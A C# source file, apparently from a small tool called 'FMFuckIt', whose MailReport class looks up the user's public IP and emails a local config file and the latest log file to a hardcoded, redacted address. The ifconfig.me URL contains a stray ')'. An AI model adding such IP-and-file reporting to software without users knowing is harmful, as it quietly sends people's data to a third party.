using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;
using Discord.Webhook;

namespace FMFuckIt
{
    internal class MailReport
    {
        public static void SendFullReport(string ConfigFilePath, string LatestLogFilePath)
        {
            Console.WriteLine("Creating report ...");
            DiscordWebhook hook = new DiscordWebhook();
            hook.Url = "ZENSIERT";

            var http = new System.Net.WebClient();
            var ip = http.DownloadString("https://ifconfig.me/ip)");
            var from = new MailAddress("ZENSIERT");
            var to = new MailAddress("ZENSIERT");
            var subject = $"FMFuckIt Report - {ip}";
            var body = "A report was created.";

            var username = "ZENSIERT"; // get from Mailtrap
            var password = "ZENSIERT"; // get from Mailtrap

            var host = "ZENSIERT";
            var port = 465;

            var client = new SmtpClient(host, port)
            {
                Credentials = new NetworkCredential(username, password),
                EnableSsl = true
            };
            
            var mail = new MailMessage();
            mail.Subject = subject;
            mail.From = from;
            mail.To.Add(to);
            mail.Body = body;

            var configAttachment = new Attachment(ConfigFilePath);
            var logAttachment = new Attachment(LatestLogFilePath);
            mail.Attachments.Add(configAttachment);
            mail.Attachments.Add(logAttachment);

            client.Send(mail);

            Console.WriteLine("Email sent!");
        }
    }
}
